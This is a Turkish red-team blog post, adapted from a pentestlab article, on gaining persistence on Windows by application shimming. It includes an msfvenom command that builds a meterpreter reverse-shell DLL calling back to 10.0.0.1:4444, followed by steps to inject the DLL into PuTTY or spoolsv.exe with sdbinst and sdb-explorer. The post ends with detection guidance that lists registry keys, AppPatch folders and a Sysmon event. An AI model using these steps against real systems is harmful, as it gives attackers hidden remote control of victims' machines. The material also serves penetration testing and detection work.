Title: Application Shimming Kullanarak Windows Sistemler Üzerinde Kalıcılık
Date: 2019-12-21 15:00
Tags: Application Shimming, Red Team, Kırmızı Takım, Windows sistemlerde kalıcılık, Windows Pentest, Windows Kırmızı Takım, Windows Red Team
Category: siber güvenlik
Authors: 0x656e


Selamlar,

Başlık bilgisinde geçen Application Shimming'i Türkçeye çevirmek oldukça zor bunun yerine anladığımı çevirdiğim yazıya ek olarak Shimming'in ne olduğunu/benim nasıl anladığımı yazmaya çalışacağım.

**Not:** Yazı benim araştırmış olduğum bir yazı olmayıp, okuyup beğendiğim, anladığımı düşündüğüm bir konu üzerinde aşağıdaki link üzerinden kendi halinde çevirilmiş bir yazıdır. Birebir ana kaynakla aynı değildir. 

## Shimming Nedir?
Windows sistemler üzerinde bir uygulamanın her sistemde çalışabilmesi adına çeşitli ayarlar barındıran bir dosyadır. `SDB` dosyası olarak sistemler üzerinde tutulmaktadır. Dosya format olarak XML dosya formatındadır. Bu sayede sistemler üzerinde admin veya geliştiriciler yüklü uygulamalar üzerinde `Uyumluluk` sorunlarını düzeltebiliyor veya patchleyebiliyorlar diyebiliriz.

Örnek bir SDB Dosyası: [Python-SDB](https://github.com/williballenthin/python-sdb)

Microsoft bu sebeple bir geliştirici kiti yayınlamıştır. Bu geliştirici kitinin ismi kısaca ADK'dır(Asssesment and Deployment Kit). 
[ADK'yı indirmek İçin Tıklayın](https://go.microsoft.com/fwlink/?linkid=2086042)

## Biz bu SDB Dosyası ile Ne yapacağız?
Yukarıda bahsetmiş olduğum `Uyumluluk` problemi için bu SDB dosyaları içerisinde InjectDLL diye bir seçenek bulundurmaktadır. Bunun sebebi geliştiricler eğer eski bir windows versiyonunda çalışacak uygulama varsa bu sisteme uygun DLL dosyasını uygulamaya dahil etmesini gerektirdiğindendir.

Windows 10 sisteme bazı uygulamaların açılabilmesi için .Net Framework 4.5 ile birlikte Net Framework 3.5 yüklemek gibi düşünebiliriz. (Sadece örnektir, geriye dönük uyumluluğun anlaşılabilmesi için vs.)

İşte bu InjectDLL özelliği bizim kullancağımız şeydir. Eğer biz burada bir uygulamaya istediğimiz bir DLL'i enjekte(!) edebilirsek bu sistem üzerinde kalıcılığı sağlamış oluruz. Üstelik görsel herhangi bir uyarı olmadan. 

**Not:** Defcon 23'de bu konuyu işleyen, gündeme getiren [Sean Pierce](https://twitter.com/secure_sean)'in orjinal sunum/videosu için aşağıdaki linki kullanabilirsiniz.

[Abusing Native Shims for Post Exploitation](https://www.youtube.com/watch?v=LOsesi3QkXY)


## Uygun bir DLL Dosyası Hazırlamak
Burada siz isterseniz kendinize özel bir DLL dosyası hazırlayabilirsiniz fakat okuduğum örnekte bu DLL dosyası Reverse Shell almak için kullanılmaktadır. 

MSFVenom ile DLL Dosya formatında Reverse Shell oluşturmak için
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll > pentestlab.dll
```

## Arayüz ile Herhangi bir Uygulamaya DLL'i Enjekte Etmek
Bunun için Windows'un bize sunmuş olduğu ADK Toolkit uygulamasını açıyoruz ve burada sol sütundan Custom databases altında yeni bir database oluşturuyoruz. 

![Windows ADK](https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-combatibility-administrator.png)


Örnek üzerinde Putty kullanılmış. Putty kullanılmasının nedeni ise sıkça kullanılan küçük bir uygulama olması ve sistem yöneticileri vs tarafından şüphe çekmeyen bir uygulama olmamasından dolayıdır. Kendisi bir clientdır.(SSH, Telnet etc.)

![Putty DLL Inject](https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-create-application-fix.png)

Aşağıdaki ekran görüntüsünde yukarıdaki ekranda next dedikten sonra InjectDLL seçeneğini seçiyoruz ve Next diyoruz.

![InjectDLL](https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll.png)

Burada açılan ekranda ise InjectDLL'in bizden parametre isteyen ekranı açılacaktır. Bu ekranda `Command Line` kısmına biraz önce oluşturduğumuz DLL dosyasının konumunu veriyoruz.

![Options for InjectDLL](https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-inject-dll-options.png)

İşte bu kadar tüm işlemler tamamlandıktan sonra artık bir `sdb` dosyasına sahibiz. Buradan sonraki kısım ise bu `sdb` dosyasını sisteme eklemek.

Bunun için 
```bash
sdbinst olusturdugunuzsdb.sdb
```

![SDB Install](https://pentestlab.files.wordpress.com/2019/12/persistence-application-shimming-installed.png)


Evet artık her şeyimiz tamamlandı, sistem yöneticimiz ne zaman Putty'yi açarsa bize Reverse Shell düşecektir. Metasploit üzerinde Multi handler açıp sürekli dinleyerek nurtopu gibi bir meterpreter shell'e sahip olabilirsiniz. 

## Arayüz Olmadan Enjekte Etmek

Bunun için CLI üzerinden aşağıdaki komutunu girmeniz yeterli olacaktır.

```
sdb-explorer.exe -r pentestlab.sdb -a istediginiz.exe
```

Tabi burada illa kurulu bir uygulama olmasına gerek yok isterseniz Windows sistem üzerinde çalışan herhangi bir exe'ye de bunu enjekte edebilirsiniz. Okuduğum makale örneğinde `spoolsv.exe` dosyasına enjekte edilmiştir.

## Peki Her Şey Güzel Biz Bu İşlem Olduğunda Anlayabilir Miyiz?

Sorunun kısa cevabı: Evet.
Uzun cevap:

Oluşturulan bu SDB dosyalarına ait kayıtlar Windows sistemler altında AppPatch klasörü altında tutulmaktadır. 

Bu klasöre ulaşmak için: 
```
%WINDIR%\AppPatch\custom
%WINDIR%\AppPatch\AppPatch64\Custom
```

Ha bunun yerine isterseniz Process Explorer içerisinde de kaybolabilirsiniz.

## Tespit etmek

Registry değişikliklerini veya dosya konumlarını izlemek bunun için bir yöntemdir. Takip edilecek Registry ve dosya konumları aşağıda verilmiştir. Oluşturulacak yeni bir key SysMon üzerinde `12` event ID ile tetiklenecektir. 

Registry konumları:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\
```

Dosya konumu:
```
%WINDIR%\AppPatch\custom
%WINDIR%\AppPatch\AppPatch64\Custom
```

Daha detaylı bir bilgi almak için Sean Price'ın [sunumunu](https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims.pdf) kullanabilirsiniz.




Okuduğum yazı:
[Persistence Application Shimming](https://pentestlab.blog/2019/12/16/persistence-application-shimming/)


## Yazı Sonu

Konu nispeten eski bir konu fakat okuduğum kaynak yeni attığı için ben de çevirme ihtiyacı duydum o yüzden bu konuda bir eleştiri kabul etmeyeceğim :D Hoş kabul etsem de umurumda değil orası ayrı.

Bu yazıyı dün sabaha doğru yazdım ve planım yazı sonuna doğru kendi duygu/durum, ülkenin hali(Nolacak bu ülkenin hali yav?), arkadaşlık ilişkileri(Arkadaşlardan ziyade tanıdıklarım kavramı) gibi içimdeki bir çok şeyi yazı sonuna dökecektim fakat gerek olmadığını düşünüyorum. Yine bir klasik olarak şarkı ile bu yazının sonunu getirelim hem konuya, hem boşvermişliklere uygun olsun.


[![](http://img.youtube.com/vi/4eAQIXcvJ3A/0.jpg)](http://www.youtube.com/watch?v=4eAQIXcvJ3A "Duygusal olmaya gerek yok")

